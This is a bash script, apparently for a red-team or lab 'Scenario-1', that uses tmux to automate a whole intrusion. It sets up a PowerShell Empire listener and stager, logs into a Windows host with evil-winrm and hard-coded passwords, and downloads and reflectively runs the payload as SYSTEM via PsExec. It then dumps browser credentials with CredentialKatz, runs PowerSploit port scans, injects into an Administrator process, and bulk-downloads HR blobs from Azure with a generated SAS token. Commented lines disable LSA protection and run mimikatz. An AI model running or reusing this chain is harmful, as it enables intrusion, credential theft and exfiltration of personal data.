#!/bin/bash

SESSION_NAME="Scenario-1"
LOG_BASE="/home/kaliadmin/logs"

mkdir /home/kaliadmin/payloads
mkdir $LOG_BASE
cp /home/kaliadmin/CredentialKatz.exe /home/kaliadmin/payloads/
cp /home/kaliadmin/webserver.py /home/kaliadmin/payloads/

LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server" 
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/kaliadmin/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 7
# set Host http://csrp1-cuhpf4czevfcajhw.z01.azurefd.net:80

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "uselistener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Host http://server_ip_1:80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Port 80" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Listener http" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/kaliadmin/payloads/Scenario1.exe" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario1.exe /home/kaliadmin/payloads/Scenario1.exe



tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/kaliadmin/payloads" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

# tmux send-keys -t $SESSION_NAME:2 "python3 -m venv myenv" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "source myenv/bin/activate" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "pip install Flask" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:2 C-m

# sleep 3

# tmux send-keys -t $SESSION_NAME:2 "python3 webserver.py" 
tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081" 
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

# read -p "Do you want to continue? (Y/N): " answer
# if [[ "$answer" != "Y" && "$answer" != "y" ]]; then
#     echo "Exiting script."
#     exit 1
# fi

tmux new-window -t $SESSION_NAME -n "Evil-Winrm - Sarfaraz Ahamed"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"
# tmux send-keys -t $SESSION_NAME:3 "cat /home/kaliadmin/payloads/credentials.txt" 
# sleep 2
# tmux send-keys -t $SESSION_NAME:3 C-m
# /home/kaliadmin/wait_for_prompt.exp "kaliadmin" $SESSION_NAME:3

# sleep 3

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\SarfarazAhamed' -p 'UserPassword@123'" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname" 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://server_ip:8081/Scenario1.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\SarfarazAhamed\Documents\PSTools.zip"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\SarfarazAhamed\Documents\PSTools.zip" -DestinationPath "C:\Users\SarfarazAhamed\Documents"' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\SarfarazAhamed\Documents\run.ps1" -accepteula' 
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1
sleep 2
tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact " 
sleep 5
tmux send-keys -t $SESSION_NAME:1 Down 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri http://server_ip:8081/CredentialKatz.exe -OutFile CredentialKatz.exe' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '.\CredentialKatz.exe' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '.\CredentialKatz.exe /edge' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'dir C:\Users\Public\Desktop' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Get-Content "C:\Users\Public\Desktop\creds.txt"' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-Command -ComputerName localhost -ScriptBlock { whoami } -Credential (New-Object System.Management.Automation.PSCredential ("CSRP\RalphMay", (ConvertTo-SecureString "UserPassword@123" -AsPlainText -Force)))' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/Invoke-Portscan.ps1" -OutFile "C:\Users\SarfarazAhamed\Documents\Invoke-Portscan.ps1"' 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '. "C:\Users\SarfarazAhamed\Documents\Invoke-Portscan.ps1"; Invoke-Portscan -Hosts "10.0.1.4-10.0.1.12" -PingOnly'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "Hostname      : 10.0.1.12" $SESSION_NAME:1


sleep 7

tmux send-keys -t $SESSION_NAME:1 '. "C:\Users\SarfarazAhamed\Documents\Invoke-Portscan.ps1"; Invoke-Portscan -Hosts "10.0.1.6" -TopPorts 100'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "Hostname      : 10.0.1.6" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "exit" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

# tmux new-window -t $SESSION_NAME -n "Administrator"

# tmux send-keys -t $SESSION_NAME:4 "evil-winrm -i 192.168.1.3 -u 'csrp\Administrator' -p P@ssw0rd@123!" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:4


tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "ps" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "Administrator" $SESSION_NAME:1

sleep 7

pid=$(cat logs/Scenario-1-1.log | grep "Administrator" | grep "cmd" | awk '{print $2}')
echo $pid

sleep 7

tmux send-keys -t $SESSION_NAME:1 "psinject http $pid" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1


sleep 7
 
# id=$(cat logs/Scenario-1-1.log | grep "Administrator" | grep "powershell" | awk '{print $2}')
# echo $id

tmux send-keys -t $SESSION_NAME:1 "agents" 
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7

# tmux send-keys -t $SESSION_NAME:1 "shell" C-m

# sleep 7 

# tmux send-keys -t $SESSION_NAME:1 'Invoke-Command -ComputerName CSRP-DC -FilePath "C:\\Users\\SarfarazAhamed\\Documents\\run.ps1"' C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "exit" C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "interact $id" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "shell" C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "whoami" C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "hostname" C-m

# sleep 7










# tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_logonpasswords" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_credentials_mimikatz_logonpasswords) >" $SESSION_NAME:1
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "execute" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1
# 
# sleep 7

# tmux select-window -t $SESSION_NAME:3

# tmux send-keys -t "$SESSION_NAME:3" C-c "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\SarfarazAhamed' -p 'UserPassword@123'" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -Property SecurityServicesConfigured, SecurityServicesRunning' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 'Restart-Computer -Force' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t "$SESSION_NAME:3" C-c

# sleep 7

# tmux send-keys -t "$SESSION_NAME:3" "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:3
# 
# sleep 7

# tmux select-window -t $SESSION_NAME:1

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "kill all" C-m

# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "y" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1
# 
# tmux select-window -t $SESSION_NAME:3

# # # Ask for user input
# # read -p "Setup Done. Do you want to proceed? (Y/N): " user_input

# # # Convert input to uppercase for comparison
# # user_input=$(echo "$user_input" | tr '[:lower:]' '[:upper:]')

# tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i 192.168.1.3 -u 'csrp\SarfarazAhamed' -p 'UserPassword@123'" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\SarfarazAhamed\Documents\run.ps1" -accepteula' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3
# 
# sleep 7

# tmux select-window -t $SESSION_NAME:1

# tmux send-keys -t $SESSION_NAME:1 "agents" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "interact " 
# sleep 1
# tmux send-keys -t $SESSION_NAME:1 Down C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1
# 
# tmux send-keys -t $SESSION_NAME:1 "usemodule powershell_credentials_mimikatz_logonpasswords" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: usemodule/powershell_credentials_mimikatz_logonpasswords) >" $SESSION_NAME:1
# 
# sleep 7

# tmux send-keys -t $SESSION_NAME:1 "execute" C-m
# /home/kaliadmin/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

# sleep 7

# usemodule powershell_collection_chromedump


tmux new-window -t $SESSION_NAME -n "Azure - John Strand"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"
tmux send-keys -t $SESSION_NAME:4 'cd /home/kaliadmin; mkdir Scenario-1; cd Scenario-1' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m

tmux send-keys -t $SESSION_NAME:4 'sudo docker run -it mcr.microsoft.com/azure-cli:cbl-mariner2.0' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u JohnStrand@sarfarazahamed2018gmail.onmicrosoft.com -p P@ssw0rd!' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage account list --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'EXPIRY_DATE=$(date -d "+1 day" +"%Y-%m-%d")' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'SAS_TOKEN=$(az storage account generate-sas --permissions acdlpruw --account-name hrdepartmentstorage --services b --resource-types sco --expiry $EXPIRY_DATE --https-only --output tsv)' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'echo $SAS_TOKEN' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage container list --account-name hrdepartmentstorage --sas-token "$SAS_TOKEN" --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage share list --account-name hrdepartmentstorage --sas-token "$SAS_TOKEN" --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage queue list --account-name hrdepartmentstorage --sas-token "$SAS_TOKEN" --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage table list --account-name hrdepartmentstorage --sas-token "$SAS_TOKEN" --output table' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'mkdir -p downloads' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'for blob in $(az storage blob list --account-name hrdepartmentstorage --container-name employee-container --sas-token "$SAS_TOKEN" --query [].name -o tsv); do az storage blob download --account-name hrdepartmentstorage --container-name employee-container --name $blob --file ./downloads/$blob --sas-token "$SAS_TOKEN" --output table; done' 
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# /home/kaliadmin/wait_for_prompt.exp "(kaliadmin" $SESSION_NAME:4
/home/kaliadmin/wait_for_prompt.exp "root" $SESSION_NAME:4

sleep 7




# tmux send-keys -t $SESSION_NAME:1 "execute" C-m

# tmux send-keys -t $SESSION_NAME:1 "execute" C-m



echo "Reached the end."

# tmux send-keys -t $SESSION_NAME:3 "Invoke-WebRequest -Uri http://:8081/Scenario1.exe -OutFile Scenario1.exe" C-m
# tmux send-keys -t $SESSION_NAME:3 '[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri "http://:8081/CredentialKatz.exe" -UseBasicParsing).Content).EntryPoint.Invoke($null, @())' C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# tmux send-keys -t $SESSION_NAME:3 ".\Scenario1.exe" C-m
# /home/kaliadmin/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

# tmux send-keys -t $SESSION_NAME:3 "exit" C-m


# tmux attach-session -t Scenario-1

# tmux kill-session -t Scenario-1
